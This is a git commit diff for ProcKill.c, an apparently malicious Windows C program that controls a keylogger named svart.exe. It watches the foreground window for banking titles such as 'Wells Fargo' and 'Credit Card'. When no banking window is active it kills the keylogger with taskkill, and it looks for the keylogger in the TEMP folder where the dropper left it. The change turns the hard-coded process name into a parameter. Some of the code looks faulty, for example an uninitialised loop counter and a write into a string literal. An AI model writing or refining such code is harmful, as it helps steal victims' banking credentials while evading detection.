81c74ff1007cf3b8590f482359b746971f91df9a
1d8 <56985822+1d8@users.noreply.github.com>
2020-08-24 15:38:37 -0700

    Update ProcKill.c

--- ProcKill.c
+++ ProcKill.c
@@ -13,16 +13,18 @@ int createpath(LPCTSTR exename, LPCTSTR environmentvar) {
 	strcat_s(malpath, strlen(malpath)+strlen(exename)+1, exename);
 }
 
-void bnk() {
+void bnk(LPCTSTR exename) {
 	const CHAR * titles[] = {"Wells Fargo", "Credit Card"};
 	TCHAR wtitle[MAX_PATH];
+	CHAR * cmd = "taskkill /F /T /IM ";
+	strcat_s(cmd, strlen(cmd)+strlen(exename)+1, exename);
 	loop:for (int z; z < sizeof(titles)/sizeof(titles[0]); z++) {
 		HWND window = GetForegroundWindow();
 		GetWindowText(window, wtitle, MAX_PATH);
 		int jamfora_3 = strncmp(wtitle, titles[0], strlen(titles[0]));
 		if (jamfora_3 != 0) {
-			//change svart.exe to name of keylogger
-			system("taskkill /F /T /IM svart.exe");
+			//system("taskkill /F /T /IM svart.exe");
+			system(cmd);
 			goto loop;
 		}
 		else {
@@ -35,8 +37,8 @@ void bnk() {
 			if (Process32First(snapshot, &entry) == TRUE) {
 				while (Process32Next(snapshot, &entry) == TRUE) {
 					int jamfora = strncmp(entry.szExeFile, "Process", strlen("Process"));
-					//change svart.exe to name of keylogger
-					if (stricmp(entry.szExeFile, "svart.exe") == 0) {
+					//if (stricmp(entry.szExeFile, "svart.exe") == 0) {
+					if (stricmp(entry.szExeFile, exename) == 0) {
 						runcheck = 1;
 					}
 					else if (jamfora == 0) {
@@ -80,6 +82,6 @@ int main() {
 	//change svart.exe & TEMP to name of keylogger & env var where it was dropped
 	createpath("//svart.exe", "TEMP");
 	while (TRUE) {	
-		bnk();
+		bnk("svart.exe");
 	}
 }
